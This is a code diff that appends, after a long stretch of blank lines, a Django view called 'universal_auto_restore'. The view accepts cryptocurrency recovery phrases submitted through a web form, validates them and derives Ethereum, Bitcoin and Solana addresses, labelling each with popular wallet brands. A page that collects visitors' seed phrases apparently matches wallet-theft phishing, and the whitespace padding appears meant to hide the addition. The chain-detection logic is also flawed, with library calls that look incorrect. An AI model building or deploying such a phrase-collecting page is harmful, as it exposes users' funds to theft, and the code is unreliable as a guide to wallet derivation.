@@ -1305,3 +1305,169 @@ def submit_form(request):
             return JsonResponse({"success": False, "error": str(e)}, status=400)
 
     return JsonResponse({"error": "Invalid request method."}, status=400)
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+from django.shortcuts import render
+from bip_utils import (
+    Bip39MnemonicValidator,
+    Bip39SeedGenerator,
+    Bip39Languages,
+    Bip44,
+    Bip49,
+    Bip84,
+    Bip44Coins,
+    Bip44Changes,
+)
+
+ETH_PATHS = [
+    "m/44'/60'/0'/0/0",
+    "m/44'/60'/0'/0/1",
+    "m/44'/60'/0'/0/2",
+]
+
+SOL_COIN = Bip44Coins.SOLANA
+
+
+def universal_auto_restore(request):
+    context = {"results": []}
+
+    if request.method == "POST":
+        phrases = request.POST.getlist("phrases[]")
+
+        for index, raw_phrase in enumerate(phrases, start=1):
+            phrase = raw_phrase.strip().lower()
+            if not phrase:
+                continue
+
+            result = {
+                "index": index,
+                "phrase": phrase,
+                "success": False,
+            }
+
+            # -------- STEP 1: VALIDATE BIP39 --------
+            try:
+                Bip39MnemonicValidator(Bip39Languages.ENGLISH).Validate(phrase)
+                result["phrase_type"] = "BIP-39"
+            except Exception:
+                result["error"] = "Unsupported phrase (non-BIP39 / Electrum default)"
+                context["results"].append(result)
+                continue
+
+            seed = Bip39SeedGenerator(phrase).Generate()
+
+            detected = False
+
+            # -------- ETHEREUM --------
+            for path in ETH_PATHS:
+                try:
+                    wallet = Bip44.FromSeedAndPath(seed, path)
+                    result.update({
+                        "success": True,
+                        "chain": "Ethereum",
+                        "wallets": "MetaMask, Trust, SafePal, Coinbase, OKX, Bitget",
+                        "address": wallet.PublicKey().ToAddress(),
+                        "path": path,
+                    })
+                    detected = True
+                    break
+                except Exception:
+                    pass
+
+            if detected:
+                context["results"].append(result)
+                continue
+
+            # -------- BITCOIN LEGACY (BIP44) --------
+            try:
+                wallet = Bip44.FromSeed(seed, Bip44Coins.BITCOIN)
+                acct = wallet.Purpose().Coin().Account(0).Change(
+                    Bip44Changes.CHAIN_EXT
+                ).AddressIndex(0)
+
+                result.update({
+                    "success": True,
+                    "chain": "Bitcoin (Legacy)",
+                    "wallets": "Electrum (BIP-39), BRD",
+                    "address": acct.PublicKey().ToAddress(),
+                })
+                context["results"].append(result)
+                continue
+            except Exception:
+                pass
+
+            # -------- BITCOIN SEGWIT (BIP49) --------
+            try:
+                wallet = Bip49.FromSeed(seed, Bip44Coins.BITCOIN)
+                acct = wallet.Purpose().Coin().Account(0).Change(
+                    Bip44Changes.CHAIN_EXT
+                ).AddressIndex(0)
+
+                result.update({
+                    "success": True,
+                    "chain": "Bitcoin (SegWit)",
+                    "wallets": "Trust Wallet, Ledger",
+                    "address": acct.PublicKey().ToAddress(),
+                })
+                context["results"].append(result)
+                continue
+            except Exception:
+                pass
+
+            # -------- BITCOIN NATIVE SEGWIT (BIP84) --------
+            try:
+                wallet = Bip84.FromSeed(seed, Bip44Coins.BITCOIN)
+                acct = wallet.Purpose().Coin().Account(0).Change(
+                    Bip44Changes.CHAIN_EXT
+                ).AddressIndex(0)
+
+                result.update({
+                    "success": True,
+                    "chain": "Bitcoin (Native SegWit)",
+                    "wallets": "BlueWallet, Sparrow",
+                    "address": acct.PublicKey().ToAddress(),
+                })
+                context["results"].append(result)
+                continue
+            except Exception:
+                pass
+
+            # -------- SOLANA --------
+            try:
+                wallet = Bip44.FromSeed(seed, SOL_COIN)
+                acct = wallet.Account(0)
+
+                result.update({
+                    "success": True,
+                    "chain": "Solana",
+                    "wallets": "Phantom, Solflare, Slope",
+                    "address": acct.PublicKey().ToAddress(),
+                })
+                context["results"].append(result)
+                continue
+            except Exception:
+                pass
+
+            # -------- FALLBACK --------
+            result["error"] = "Valid phrase but no supported wallet detected"
+            context["results"].append(result)
+
+    return render(request, "restore.html", context)
